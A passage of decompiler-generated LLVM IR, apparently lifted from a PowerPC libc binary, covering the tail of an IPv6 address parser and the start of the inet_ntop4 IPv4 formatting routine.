  br label %dec_label_pc_10014bac

dec_label_pc_100149f8:                            ; preds = %dec_label_pc_100149d8
  %v2_100149f8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100149f8, i32* %r3.global-to-local, align 4
  store i32 268519944, i32* @lr, align 4
  %v3_10014a04 = call i32 @__GI_memset(i32 %v2_100149f8, i32 0, i32 16)
  store i32 %v3_10014a04, i32* %r3.global-to-local, align 4
  %v0_10014a08 = load i32, i32* @r29, align 4
  %v1_10014a08 = inttoptr i32 %v0_10014a08 to i8*
  %v2_10014a08 = load i8, i8* %v1_10014a08, align 1
  %v3_10014a08 = zext i8 %v2_10014a08 to i32
  store i32 %v3_10014a08, i32* %r0.global-to-local, align 4
  store i32 %v3_10014a04, i32* @r31, align 4
  %v2_10014a10 = add i32 %v3_10014a04, 16
  store i32 %v2_10014a10, i32* @r27, align 4
  %v3_10014a14 = icmp eq i8 %v2_10014a08, 58
  br i1 %v3_10014a14, label %dec_label_pc_10014a1c, label %dec_label_pc_10014a28

dec_label_pc_10014a1c:                            ; preds = %dec_label_pc_100149f8
  %v1_10014a1c = add i32 %v0_10014a08, 1
  %v2_10014a1c = inttoptr i32 %v1_10014a1c to i8*
  %v3_10014a1c = load i8, i8* %v2_10014a1c, align 1
  %v4_10014a1c = zext i8 %v3_10014a1c to i32
  store i32 %v4_10014a1c, i32* %r0.global-to-local, align 4
  store i32 %v1_10014a1c, i32* @r29, align 4
  %v3_10014a20 = icmp eq i8 %v3_10014a1c, 58
  br i1 %v3_10014a20, label %dec_label_pc_10014a28, label %dec_label_pc_10014ba8

dec_label_pc_10014a28:                            ; preds = %dec_label_pc_10014a1c, %dec_label_pc_100149f8
  %v0_10014a28 = phi i32 [ %v1_10014a1c, %dec_label_pc_10014a1c ], [ %v0_10014a08, %dec_label_pc_100149f8 ]
  store i32 %v0_10014a28, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_10014afc3036 = inttoptr i32 %v0_10014a28 to i8*
  %v2_10014afc3137 = load i8, i8* %v1_10014afc3036, align 1
  %v3_10014afc3238 = zext i8 %v2_10014afc3137 to i32
  store i32 %v3_10014afc3238, i32* %r3.global-to-local, align 4
  store i32 268520196, i32* @lr, align 4
  %v1_10014b003339 = call i32 @__GI_tolower(i32 %v3_10014afc3238)
  store i32 %v1_10014b003339, i32* %r3.global-to-local, align 4
  store i32 %v1_10014b003339, i32* @r30, align 4
  %v3_10014b043440 = icmp eq i32 %v1_10014b003339, 0
  br i1 %v3_10014b043440, label %dec_label_pc_10014b0c, label %dec_label_pc_10014a34.lr.ph

dec_label_pc_10014a34:                            ; preds = %dec_label_pc_10014a34.lr.ph, %dec_label_pc_10014afc.backedge
  %v1_10014b0035 = phi i32 [ %v1_10014b003341, %dec_label_pc_10014a34.lr.ph ], [ %v1_10014b00, %dec_label_pc_10014afc.backedge ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1001c368.1169 to i32), i32* @r25, align 4
  %v0_10014a40 = load i32, i32* @r29, align 4
  %v1_10014a40 = add i32 %v0_10014a40, 1
  store i32 %v1_10014a40, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1001c368.1169 to i32), i32* @r3, align 4
  store i32 268520012, i32* @lr, align 4
  %v3_10014a48 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1001c368.1169 to i32), i32 %v1_10014b0035)
  store i32 %v3_10014a48, i32* %r3.global-to-local, align 4
  %v3_10014a4c = icmp eq i32 %v3_10014a48, 0
  br i1 %v3_10014a4c, label %dec_label_pc_10014a6c, label %dec_label_pc_10014a54

dec_label_pc_10014a54:                            ; preds = %dec_label_pc_10014a34
  %v0_10014a54 = load i32, i32* @r25, align 4
  %v2_10014a54 = sub i32 %v3_10014a48, %v0_10014a54
  store i32 %v2_10014a54, i32* %r0.global-to-local, align 4
  %v0_10014a58 = load i32, i32* @r28, align 4
  %v1_10014a58 = mul i32 %v0_10014a58, 16
  store i32 %v1_10014a58, i32* %r9.global-to-local, align 4
  %v2_10014a5c = or i32 %v1_10014a58, %v2_10014a54
  store i32 %v2_10014a5c, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_10014a5c, 65536
  br i1 %tmp19, label %dec_label_pc_10014af8, label %dec_label_pc_10014ba8

dec_label_pc_10014a6c:                            ; preds = %dec_label_pc_10014a34
  %v0_10014a6c = load i32, i32* @r30, align 4
  %v3_10014a6c = icmp eq i32 %v0_10014a6c, 58
  br i1 %v3_10014a6c, label %dec_label_pc_10014a74, label %dec_label_pc_10014ac8

dec_label_pc_10014a74:                            ; preds = %dec_label_pc_10014a6c
  %v0_10014a74 = load i32, i32* @r23, align 4
  %v3_10014a74 = icmp eq i32 %v0_10014a74, 0
  br i1 %v3_10014a74, label %dec_label_pc_10014a7c, label %dec_label_pc_10014a90

dec_label_pc_10014a7c:                            ; preds = %dec_label_pc_10014a74
  %v0_10014a7c = load i32, i32* @r24, align 4
  %v3_10014a7c = icmp eq i32 %v0_10014a7c, 0
  br i1 %v3_10014a7c, label %dec_label_pc_10014a84, label %dec_label_pc_10014ba8

dec_label_pc_10014a84:                            ; preds = %dec_label_pc_10014a7c
  %v0_10014a84 = load i32, i32* @r31, align 4
  store i32 %v0_10014a84, i32* @r24, align 4
  %v0_10014a88 = load i32, i32* @r29, align 4
  store i32 %v0_10014a88, i32* @r26, align 4
  br label %dec_label_pc_10014afc.backedge

dec_label_pc_10014a90:                            ; preds = %dec_label_pc_10014a74
  %v0_10014a90 = load i32, i32* @r29, align 4
  %v1_10014a90 = inttoptr i32 %v0_10014a90 to i8*
  %v2_10014a90 = load i8, i8* %v1_10014a90, align 1
  %v3_10014a90 = zext i8 %v2_10014a90 to i32
  store i32 %v3_10014a90, i32* %r0.global-to-local, align 4
  %v3_10014a94 = icmp eq i8 %v2_10014a90, 0
  br i1 %v3_10014a94, label %dec_label_pc_10014ba8, label %dec_label_pc_10014a9c

dec_label_pc_10014a9c:                            ; preds = %dec_label_pc_10014a90
  %v0_10014a9c = load i32, i32* @r31, align 4
  %v1_10014a9c = add i32 %v0_10014a9c, 2
  store i32 %v1_10014a9c, i32* %r0.global-to-local, align 4
  %v1_10014aa0 = load i32, i32* @r27, align 4
  %v3_10014aa0 = icmp ugt i32 %v1_10014a9c, %v1_10014aa0
  br i1 %v3_10014aa0, label %dec_label_pc_10014ba8, label %dec_label_pc_10014aa8

dec_label_pc_10014aa8:                            ; preds = %dec_label_pc_10014a9c
  %v0_10014aa8 = load i32, i32* @r28, align 4
  %v1_10014aa8 = udiv i32 %v0_10014aa8, 256
  store i32 %v1_10014aa8, i32* %r0.global-to-local, align 4
  %v1_10014aac = trunc i32 %v0_10014aa8 to i8
  %v3_10014aac = add i32 %v0_10014a9c, 1
  %v4_10014aac = inttoptr i32 %v3_10014aac to i8*
  store i8 %v1_10014aac, i8* %v4_10014aac, align 1
  %v0_10014ab0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10014ab0 = trunc i32 %v0_10014ab0 to i8
  %v2_10014ab0 = load i32, i32* @r31, align 4
  %v3_10014ab0 = inttoptr i32 %v2_10014ab0 to i8*
  store i8 %v1_10014ab0, i8* %v3_10014ab0, align 1
  %v0_10014ab4 = load i32, i32* @r29, align 4
  store i32 %v0_10014ab4, i32* @r26, align 4
  %v0_10014ab8 = load i32, i32* @r31, align 4
  %v1_10014ab8 = add i32 %v0_10014ab8, 2
  store i32 %v1_10014ab8, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_10014afc30 = inttoptr i32 %v0_10014ab4 to i8*
  %v2_10014afc31 = load i8, i8* %v1_10014afc30, align 1
  %v3_10014afc32 = zext i8 %v2_10014afc31 to i32
  store i32 %v3_10014afc32, i32* %r3.global-to-local, align 4
  store i32 268520196, i32* @lr, align 4
  %v1_10014b0033 = call i32 @__GI_tolower(i32 %v3_10014afc32)
  store i32 %v1_10014b0033, i32* %r3.global-to-local, align 4
  store i32 %v1_10014b0033, i32* @r30, align 4
  %v3_10014b0434 = icmp eq i32 %v1_10014b0033, 0
  br i1 %v3_10014b0434, label %dec_label_pc_10014b0c, label %dec_label_pc_10014a34.lr.ph

dec_label_pc_10014a34.lr.ph:                      ; preds = %dec_label_pc_10014a28, %dec_label_pc_10014aa8
  %v1_10014b003341 = phi i32 [ %v1_10014b0033, %dec_label_pc_10014aa8 ], [ %v1_10014b003339, %dec_label_pc_10014a28 ]
  br label %dec_label_pc_10014a34

dec_label_pc_10014ac8:                            ; preds = %dec_label_pc_10014a6c
  %v3_10014ac8 = icmp eq i32 %v0_10014a6c, 46
  br i1 %v3_10014ac8, label %dec_label_pc_10014ad0, label %dec_label_pc_10014ba8

dec_label_pc_10014ad0:                            ; preds = %dec_label_pc_10014ac8
  %v0_10014ad0 = load i32, i32* @r31, align 4
  %v1_10014ad0 = add i32 %v0_10014ad0, 4
  store i32 %v1_10014ad0, i32* @r30, align 4
  %v1_10014ad4 = load i32, i32* @r27, align 4
  %v3_10014ad4 = icmp ugt i32 %v1_10014ad0, %v1_10014ad4
  br i1 %v3_10014ad4, label %dec_label_pc_10014ba8, label %dec_label_pc_10014adc

dec_label_pc_10014adc:                            ; preds = %dec_label_pc_10014ad0
  %v0_10014ae0 = load i32, i32* @r26, align 4
  store i32 %v0_10014ae0, i32* %r3.global-to-local, align 4
  store i32 268520168, i32* @lr, align 4
  %v3_10014ae4 = call i32 @inet_pton4(i32 %v0_10014ae0, i32 %v0_10014ad0)
  store i32 %v3_10014ae4, i32* %r3.global-to-local, align 4
  %v0_10014ae8 = load i32, i32* @r30, align 4
  store i32 %v0_10014ae8, i32* @r31, align 4
  %v2_10014aec = icmp sgt i32 %v3_10014ae4, 0
  br i1 %v2_10014aec, label %dec_label_pc_10014b30, label %dec_label_pc_10014ba8

dec_label_pc_10014af8:                            ; preds = %dec_label_pc_10014a54
  store i32 1, i32* @r23, align 4
  %v0_10014afc.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10014afc.backedge

dec_label_pc_10014afc.backedge:                   ; preds = %dec_label_pc_10014af8, %dec_label_pc_10014a84
  %v0_10014afc.be = phi i32 [ %v0_10014afc.pre.pre, %dec_label_pc_10014af8 ], [ %v0_10014a88, %dec_label_pc_10014a84 ]
  %v1_10014afc = inttoptr i32 %v0_10014afc.be to i8*
  %v2_10014afc = load i8, i8* %v1_10014afc, align 1
  %v3_10014afc = zext i8 %v2_10014afc to i32
  store i32 %v3_10014afc, i32* %r3.global-to-local, align 4
  store i32 268520196, i32* @lr, align 4
  %v1_10014b00 = call i32 @__GI_tolower(i32 %v3_10014afc)
  store i32 %v1_10014b00, i32* %r3.global-to-local, align 4
  store i32 %v1_10014b00, i32* @r30, align 4
  %v3_10014b04 = icmp eq i32 %v1_10014b00, 0
  br i1 %v3_10014b04, label %dec_label_pc_10014b0c, label %dec_label_pc_10014a34

dec_label_pc_10014b0c:                            ; preds = %dec_label_pc_10014afc.backedge, %dec_label_pc_10014a28, %dec_label_pc_10014aa8
  %v0_10014b0c = load i32, i32* @r23, align 4
  %v3_10014b0c = icmp eq i32 %v0_10014b0c, 0
  %v0_10014b74.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_10014b0c, label %dec_label_pc_10014b30, label %dec_label_pc_10014b14

dec_label_pc_10014b14:                            ; preds = %dec_label_pc_10014b0c
  %v1_10014b14 = add i32 %v0_10014b74.pre.pre, 2
  store i32 %v1_10014b14, i32* %r0.global-to-local, align 4
  %v1_10014b18 = load i32, i32* @r27, align 4
  %v3_10014b18 = icmp ugt i32 %v1_10014b14, %v1_10014b18
  br i1 %v3_10014b18, label %dec_label_pc_10014ba8, label %dec_label_pc_10014b20

dec_label_pc_10014b20:                            ; preds = %dec_label_pc_10014b14
  %v0_10014b20 = load i32, i32* @r28, align 4
  %v1_10014b20 = udiv i32 %v0_10014b20, 256
  store i32 %v1_10014b20, i32* %r0.global-to-local, align 4
  %v1_10014b24 = trunc i32 %v0_10014b20 to i8
  %v3_10014b24 = add i32 %v0_10014b74.pre.pre, 1
  %v4_10014b24 = inttoptr i32 %v3_10014b24 to i8*
  store i8 %v1_10014b24, i8* %v4_10014b24, align 1
  %v0_10014b28 = load i32, i32* %r0.global-to-local, align 4
  %v1_10014b28 = trunc i32 %v0_10014b28 to i8
  %v2_10014b28 = load i32, i32* @r31, align 4
  %v3_10014b28 = inttoptr i32 %v2_10014b28 to i8*
  store i8 %v1_10014b28, i8* %v3_10014b28, align 1
  %v0_10014b2c = load i32, i32* @r31, align 4
  %v1_10014b2c = add i32 %v0_10014b2c, 2
  store i32 %v1_10014b2c, i32* @r31, align 4
  br label %dec_label_pc_10014b30

dec_label_pc_10014b30:                            ; preds = %dec_label_pc_10014b0c, %dec_label_pc_10014adc, %dec_label_pc_10014b20
  %v0_10014b74.pre = phi i32 [ %v0_10014ae8, %dec_label_pc_10014adc ], [ %v1_10014b2c, %dec_label_pc_10014b20 ], [ %v0_10014b74.pre.pre, %dec_label_pc_10014b0c ]
  %v0_10014b30 = load i32, i32* @r24, align 4
  %v3_10014b30 = icmp eq i32 %v0_10014b30, 0
  %v1_10014b74.pre = load i32, i32* @r27, align 4
  %v4_10014b74 = icmp eq i32 %v0_10014b74.pre, %v1_10014b74.pre
  br i1 %v3_10014b30, label %dec_label_pc_10014b74, label %dec_label_pc_10014b38

dec_label_pc_10014b38:                            ; preds = %dec_label_pc_10014b30
  %v2_10014b3c = sub i32 %v0_10014b74.pre, %v0_10014b30
  store i32 %v2_10014b3c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_10014b74, label %dec_label_pc_10014ba8, label %dec_label_pc_10014b5c.preheader

dec_label_pc_10014b5c.preheader:                  ; preds = %dec_label_pc_10014b38
  %v3_10014b5c24 = icmp slt i32 %v2_10014b3c, 1
  %v2_10014b6026 = add i32 %v2_10014b3c, -1
  store i32 %v2_10014b6026, i32* %r10.global-to-local, align 4
  %v2_10014b6427 = add i32 %v1_10014b74.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_10014b5c24, label %dec_label_pc_10014b74.thread, label %dec_label_pc_10014b50

dec_label_pc_10014b50:                            ; preds = %dec_label_pc_10014b5c.preheader, %dec_label_pc_10014b50.dec_label_pc_10014b50_crit_edge
  %v0_10014b50 = phi i32 [ %v0_10014b50.pre, %dec_label_pc_10014b50.dec_label_pc_10014b50_crit_edge ], [ %v0_10014b30, %dec_label_pc_10014b5c.preheader ]
  %v2_10014b6429 = phi i32 [ %v2_10014b64, %dec_label_pc_10014b50.dec_label_pc_10014b50_crit_edge ], [ %v2_10014b6427, %dec_label_pc_10014b5c.preheader ]
  %v2_10014b6028 = phi i32 [ %v2_10014b60, %dec_label_pc_10014b50.dec_label_pc_10014b50_crit_edge ], [ %v2_10014b6026, %dec_label_pc_10014b5c.preheader ]
  %v2_10014b50 = add i32 %v0_10014b50, %v2_10014b6028
  %v3_10014b50 = inttoptr i32 %v2_10014b50 to i8*
  %v4_10014b50 = load i8, i8* %v3_10014b50, align 1
  %v5_10014b50 = zext i8 %v4_10014b50 to i32
  store i32 %v5_10014b50, i32* %r0.global-to-local, align 4
  %v3_10014b54 = inttoptr i32 %v2_10014b6429 to i8*
  store i8 %v4_10014b50, i8* %v3_10014b54, align 1
  %v0_10014b58 = load i32, i32* %r8.global-to-local, align 4
  %v1_10014b58 = load i32, i32* @r24, align 4
  %v2_10014b58 = load i32, i32* %r10.global-to-local, align 4
  %v3_10014b58 = trunc i32 %v0_10014b58 to i8
  %v4_10014b58 = add i32 %v2_10014b58, %v1_10014b58
  %v5_10014b58 = inttoptr i32 %v4_10014b58 to i8*
  store i8 %v3_10014b58, i8* %v5_10014b58, align 1
  %v0_10014b5c.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10014b5c.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10014b64.pre = load i32, i32* @r27, align 4
  %v3_10014b5c = icmp slt i32 %v1_10014b5c.pre, %v0_10014b5c.pre
  %v2_10014b60 = sub i32 %v1_10014b5c.pre, %v0_10014b5c.pre
  store i32 %v2_10014b60, i32* %r10.global-to-local, align 4
  %v1_10014b68 = add i32 %v0_10014b5c.pre, 1
  store i32 %v1_10014b68, i32* %r9.global-to-local, align 4
  br i1 %v3_10014b5c, label %dec_label_pc_10014b74.thread, label %dec_label_pc_10014b50.dec_label_pc_10014b50_crit_edge

dec_label_pc_10014b50.dec_label_pc_10014b50_crit_edge: ; preds = %dec_label_pc_10014b50
  %v2_10014b64 = sub i32 %v1_10014b64.pre, %v0_10014b5c.pre
  %v0_10014b50.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_10014b50

dec_label_pc_10014b74.thread:                     ; preds = %dec_label_pc_10014b50, %dec_label_pc_10014b5c.preheader
  %v0_10014b70.lcssa = phi i32 [ %v1_10014b74.pre, %dec_label_pc_10014b5c.preheader ], [ %v1_10014b64.pre, %dec_label_pc_10014b50 ]
  store i32 %v0_10014b70.lcssa, i32* @r31, align 4
  br label %dec_label_pc_10014b7c

dec_label_pc_10014b74:                            ; preds = %dec_label_pc_10014b30
  br i1 %v4_10014b74, label %dec_label_pc_10014b7c, label %dec_label_pc_10014ba8

dec_label_pc_10014b7c:                            ; preds = %dec_label_pc_10014b74.thread, %dec_label_pc_10014b74
  %v0_10014b7c = load i32, i32* @r22, align 4
  store i32 %v0_10014b7c, i32* @r3, align 4
  store i32 %v2_100149f8, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10014b8c.1170 to i32), i32* @lr, align 4
  %v0_10014b88 = call i32 @memcpy()
  store i32 %v0_10014b88, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014bac

dec_label_pc_10014b94:                            ; preds = %dec_label_pc_100149d8
  %v0_10014b94 = call i32 @__errno_location()
  store i32 %v0_10014b94, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10014ba0 = inttoptr i32 %v0_10014b94 to i32*
  store i32 97, i32* %v2_10014ba0, align 4
  %v0_10014bb0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014bac

dec_label_pc_10014ba8:                            ; preds = %dec_label_pc_10014a9c, %dec_label_pc_10014a90, %dec_label_pc_10014a54, %dec_label_pc_10014a7c, %dec_label_pc_10014b38, %dec_label_pc_10014adc, %dec_label_pc_10014ac8, %dec_label_pc_10014b74, %dec_label_pc_10014a1c, %dec_label_pc_10014b14, %dec_label_pc_10014ad0
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014bac

dec_label_pc_10014bac:                            ; preds = %dec_label_pc_10014b94, %dec_label_pc_10014b7c, %dec_label_pc_100149e4, %dec_label_pc_10014ba8
  %v0_10014bb0 = phi i32 [ %v0_10014bb0.pre, %dec_label_pc_10014b94 ], [ 1, %dec_label_pc_10014b7c ], [ %v3_100149ec, %dec_label_pc_100149e4 ], [ 0, %dec_label_pc_10014ba8 ]
  store i32 %v0_100149bc, i32* %r0.global-to-local, align 4
  store i32 %v0_10014bb0, i32* %r3.global-to-local, align 4
  ret i32 %v0_10014bb0

; uselistorder directives
  uselistorder i32 %v0_10014bb0, { 1, 0 }
  uselistorder i32 %v2_10014b60, { 1, 0 }
  uselistorder i32 %v0_10014b5c.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_10014b74, { 1, 0 }
  uselistorder i32 %v0_10014b74.pre, { 1, 0 }
  uselistorder i32 %v0_10014b20, { 1, 0 }
  uselistorder i32 %v0_10014b74.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10014b00, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10014aa8, { 1, 0 }
  uselistorder i32 %v1_10014a58, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 8, 9, 13, 14, 10, 11, 2, 1, 12, 4, 3, 15, 16, 17, 18, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0 }
  uselistorder i32 58, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268520196, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_10014bac, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10014ba8, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_10014b7c, { 1, 0 }
  uselistorder label %dec_label_pc_10014b50, { 1, 0 }
  uselistorder label %dec_label_pc_10014b30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014b0c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10014a34.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10014a34, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10014c1c.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_10014bc4 = load i32, i32* @lr, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_10014bf0 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_10014bf0, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_10014c00.1173 to i32), i32* @lr, align 4
  %v3_10014bfc = call i32 @__GI_memset(i32 %v2_10014bf0, i32 0, i32 15)
  store i32 %v3_10014bfc, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_10014cc02 = load i32, i32* @r1, align 4
  store i32 %v0_10014cc02, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10014c1c

dec_label_pc_10014c1c:                            ; preds = %dec_label_pc_10014c90.dec_label_pc_10014c1c_crit_edge, %dec_label_pc_10014c1c.lr.ph
  %v2_10014c3c = phi i32 [ %v2_10014cc0, %dec_label_pc_10014c90.dec_label_pc_10014c1c_crit_edge ], [ %v0_10014cc02, %dec_label_pc_10014c1c.lr.ph ]
  %v0_10014c30 = phi i32 [ %v0_10014cc0, %dec_label_pc_10014c90.dec_label_pc_10014c1c_crit_edge ], [ %v0_10014cc02, %dec_label_pc_10014c1c.lr.ph ]
  %v0_10014c20 = phi i32 [ %v1_10014cc0, %dec_label_pc_10014c90.dec_label_pc_10014c1c_crit_edge ], [ 0, %dec_label_pc_10014c1c.lr.ph ]
  %v1_10014c28 = phi i32 [ %v1_10014c1c.pre, %dec_label_pc_10014c90.dec_label_pc_10014c1c_crit_edge ], [ 0, %dec_label_pc_10014c1c.lr.ph ]
  %v0_10014c1c = load i32, i32* %r31.global-to-local, align 4
  %v2_10014c1c = add i32 %v0_10014c1c, %v1_10014c28
  %v3_10014c1c = inttoptr i32 %v2_10014c1c to i8*
  %v4_10014c1c = load i8, i8* %v3_10014c1c, align 1
  %v5_10014c1c = zext i8 %v4_10014c1c to i32
  store i32 %v5_10014c1c, i32* %r10.global-to-local, align 4
  store i32 %v0_10014c20, i32* %r8.global-to-local, align 4
  %v1_10014c24 = add i32 %v0_10014c20, 1
  store i32 %v1_10014c24, i32* %r11.global-to-local, align 4
  store i32 %v2_10014c1c, i32* %r3.global-to-local, align 4
  %v1_10014c2c = load i32, i32* @r28, align 4
  %v2_10014c2c = udiv i32 %v5_10014c1c, %v1_10014c2c
  %v2_10014c30 = add i32 %v1_10014c24, %v0_10014c30
  store i32 %v2_10014c30, i32* %r6.global-to-local, align 4
  %v1_10014c34 = add nuw nsw i32 %v2_10014c2c, 48
  %v1_10014c38 = urem i32 %v1_10014c34, 256
  store i32 %v1_10014c38, i32* %r0.global-to-local, align 4
  %v1_10014c3c = trunc i32 %v1_10014c34 to i8
  %v3_10014c3c = add i32 %v2_10014c3c, 8
  %v4_10014c3c = inttoptr i32 %v3_10014c3c to i8*
  store i8 %v1_10014c3c, i8* %v4_10014c3c, align 1
  %v0_10014c40 = load i32, i32* %r0.global-to-local, align 4
  %v3_10014c40 = icmp eq i32 %v0_10014c40, 48
  %v0_10014c48 = load i32, i32* %r10.global-to-local, align 4
  %v1_10014c48 = load i32, i32* %r5.global-to-local, align 4
  %v2_10014c48 = udiv i32 %v0_10014c48, %v1_10014c48
  store i32 %v2_10014c48, i32* %r9.global-to-local, align 4
  br i1 %v3_10014c40, label %dec_label_pc_10014c48, label %dec_label_pc_10014c74

dec_label_pc_10014c48:                            ; preds = %dec_label_pc_10014c1c
  %v2_10014c4c = udiv i32 %v2_10014c48, %v1_10014c48
  %tmp18 = mul i32 %v2_10014c4c, -10
  %v2_10014c54 = add i32 %v2_10014c48, 48
  %v1_10014c58 = add i32 %v2_10014c54, %tmp18
  store i32 %v1_10014c58, i32* %r9.global-to-local, align 4
  %v1_10014c5c = urem i32 %v1_10014c58, 256
  store i32 %v1_10014c5c, i32* %r0.global-to-local, align 4
  %v1_10014c60 = trunc i32 %v1_10014c58 to i8
  %v2_10014c60 = load i32, i32* %r7.global-to-local, align 4
  %v3_10014c60 = add i32 %v2_10014c60, 8
  %v4_10014c60 = inttoptr i32 %v3_10014c60 to i8*
  store i8 %v1_10014c60, i8* %v4_10014c60, align 1
  %v0_10014c64 = load i32, i32* %r0.global-to-local, align 4
  %v3_10014c64 = icmp eq i32 %v0_10014c64, 48
  br i1 %v3_10014c64, label %dec_label_pc_10014c90, label %dec_label_pc_10014c6c

dec_label_pc_10014c6c:                            ; preds = %dec_label_pc_10014c48
  %v0_10014c6c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10014c6c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10014c90

dec_label_pc_10014c74:                            ; preds = %dec_label_pc_10014c1c
  %v0_10014c78 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014c78 = add i32 %v0_10014c78, 1
  store i32 %v1_10014c78, i32* %r8.global-to-local, align 4
  %v2_10014c7c = udiv i32 %v2_10014c48, %v1_10014c48
  %v1_10014c80 = mul i32 %v2_10014c7c, 10
  store i32 %v1_10014c80, i32* %r0.global-to-local, align 4
  %v2_10014c84 = sub i32 %v2_10014c48, %v1_10014c80
  %v1_10014c88 = add i32 %v2_10014c84, 48
  store i32 %v1_10014c88, i32* %r9.global-to-local, align 4
  %v1_10014c8c = trunc i32 %v1_10014c88 to i8
  %v2_10014c8c = load i32, i32* %r6.global-to-local, align 4
  %v3_10014c8c = add i32 %v2_10014c8c, 8
  %v4_10014c8c = inttoptr i32 %v3_10014c8c to i8*
  store i8 %v1_10014c8c, i8* %v4_10014c8c, align 1
  br label %dec_label_pc_10014c90

dec_label_pc_10014c90:                            ; preds = %dec_label_pc_10014c48, %dec_label_pc_10014c6c, %dec_label_pc_10014c74
  %v0_10014c90 = load i32, i32* %r3.global-to-local, align 4
  %v1_10014c90 = inttoptr i32 %v0_10014c90 to i8*
  %v2_10014c90 = load i8, i8* %v1_10014c90, align 1
  %v3_10014c90 = zext i8 %v2_10014c90 to i32
  %v0_10014c94 = load i32, i32* %r8.global-to-local, align 4
  %v1_10014c94 = add i32 %v0_10014c94, 1
  %v0_10014c98 = load i32, i32* @r1, align 4
  %v2_10014c98 = add i32 %v0_10014c98, %v0_10014c94
  store i32 %v2_10014c98, i32* %r10.global-to-local, align 4
  %v2_10014c9c = add i32 %v1_10014c94, %v0_10014c98
  store i32 %v2_10014c9c, i32* %r8.global-to-local, align 4
  %v1_10014ca0 = load i32, i32* %r5.global-to-local, align 4
  %v2_10014ca0 = udiv i32 %v3_10014c90, %v1_10014ca0
  %v1_10014ca4 = add i32 %v0_10014c94, 2
  store i32 %v1_10014ca4, i32* %r11.global-to-local, align 4
  %v0_10014ca8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10014ca8 = add i32 %v0_10014ca8, 1
  store i32 %v1_10014ca8, i32* %r4.global-to-local, align 4
  %v1_10014cac = mul nuw nsw i32 %v2_10014ca0, 10
